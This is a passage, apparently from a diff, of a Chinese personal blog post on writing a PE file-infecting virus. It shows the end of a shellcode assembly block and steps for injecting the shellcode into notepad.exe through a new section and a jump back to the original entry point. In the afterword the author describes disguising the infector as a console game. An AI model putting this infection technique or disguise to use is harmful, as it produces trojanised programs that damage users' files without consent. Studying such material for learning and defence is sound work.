call [edi - 0x04]<br>        mov esp, esi<br>        pop ebp<br>        xor ebx, ebx<br>        push ebx<br>        call [edi - 0x0c]<br>        nop<br>        nop<br>        nop<br>    &#125;<br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="获取shellcode的机器码"><a href="#获取shellcode的机器码" class="headerlink" title="获取shellcode的机器码"></a>获取shellcode的机器码</h2><p>编译上面的代码，然后将生成的exe放入OD，选择反汇编，在左下角即可看到我们输入的汇编，然后将他的机器码复制下来即可。</p>
+<h2 id="将shellcode写入"><a href="#将shellcode写入" class="headerlink" title="将shellcode写入"></a>将shellcode写入</h2><p>简单的用fwrite往新节的pointertorawdata的位置写入shellcode即可。</p>
+<h2 id="跳回原来的entrypoint"><a href="#跳回原来的entrypoint" class="headerlink" title="跳回原来的entrypoint"></a>跳回原来的entrypoint</h2><p>运行一下已经完成的程序，这会将notepad.exe写入shellcode，修改entrypoint，总之就是一切都完成了除了跳回原本的entrypoint。这时我们将notepad.exe放入OD，可以很快地找到我们的shellcode的汇编，然后慢慢走到最后，可以看到一个jmp指令，这个是PE装载器在装入这个节的时候自动加上的。我们记住这个指令的地址，然后用这个指令地址减去我们修改的入口点+5（这个指令的下一个指令的地址），然后再写入shellcode之后再加上一条对应的jmp指令即可。<br>至此，我们的shellcode注入就完成了。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>后来我还把这个病毒程序所有的printf函数全注释掉，exit变成return，然后伪装成了一个简简单单的控制台小游戏，这样在你玩游戏的时候就会不知不觉的发现你同目录下的notepad.exe被感染了。而且本来跳回原来的entrypoint这个地方我是想让他自动实现的，可以看到我的changeentry函数返回了两个入口点之间的差值，但是我做到最后转念一想，我本来就是做了一个学习性质的感染程序，没必要啊，然后就没做，事实上只要我们得出了jmp的位置和修改后的entrypoint的差值，再加上两个入口点的差值，自动地写入jmp指令就可以了。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Gμn_</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://such-stupid6.github.io/2020/04/08/PE%E7%97%85%E6%AF%92/" title="PE病毒">http://such-stupid6.github.io/2020/04/08/PE%E7%97%85%E6%AF%92/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/" rel="tag"># 恶意代码</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/19/PE%E6%A0%BC%E5%BC%8F/" rel="next" title="PE格式">
+                <i class="fa fa-chevron-left"></i> PE格式
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/author.jpg"
+                alt="Gμn_" />
+            
+              <p class="site-author-name" itemprop="name">Gμn_</p>
+              <p class="site-description motion-element" itemprop="description">a noob will become a big guy.</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">22</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/such-stupid6" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:alexi_bi@qq.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="mlogs.top" title="My0sotis" target="_blank">My0sotis</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#导语"><span class="nav-number">1.</span> <span class="nav-text">导语</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#目标"><span class="nav-number">2.</span> <span class="nav-text">目标</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基本思路"><span class="nav-number">3.</span> <span class="nav-text">基本思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#具体实现"><span class="nav-number">4.</span> <span class="nav-text">具体实现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#新建节"><span class="nav-number">4.1.</span> <span class="nav-text">新建节</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#修改入口点"><span class="nav-number">4.2.</span> <span class="nav-text">修改入口点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#编写shellcode"><span class="nav-number">4.3.</span> <span class="nav-text">编写shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#获取kernel32-dll基址并读引入表以获得想要的函数"><span class="nav-number">4.3.1.</span> <span class="nav-text">获取kernel32.dll基址并读引入表以获得想要的函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#获取kernel32-dll的基地址"><span class="nav-number">4.3.1.1.</span> <span class="nav-text">获取kernel32.dll的基地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#读取kernel32-dll的引入表"><span class="nav-number">4.3.1.2.</span> <span class="nav-text">读取kernel32.dll的引入表</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#寻找对应的函数"><span class="nav-number">4.3.2.</span> <span class="nav-text">寻找对应的函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取shellcode的机器码"><span class="nav-number">4.4.</span> <span class="nav-text">获取shellcode的机器码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#将shellcode写入"><span class="nav-number">4.5.</span> <span class="nav-text">将shellcode写入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#跳回原来的entrypoint"><span class="nav-number">4.6.</span> <span class="nav-text">跳回原来的entrypoint</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后记"><span class="nav-number">5.</span> <span class="nav-text">后记</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright"> &copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Gμn_</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v4.2.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.5.0</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="总访客量">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="总访问量">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+      
+  
+  <script type="text/javascript" color='114,114,114' opacity='1' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script id="ribbon" type="text/javascript" size="300" alpha="0.6"  zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.5.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.5.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.5.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.5.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.5.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
+
+  
+  
+  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
+  
+
+  <script src="/js/src/algolia-search.js?v=6.5.0"></script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+          if(result)$(this).text('复制成功')
+          else $(this).text('复制失败')
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('复制')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":true},"log":false});</script></body>
+</html>
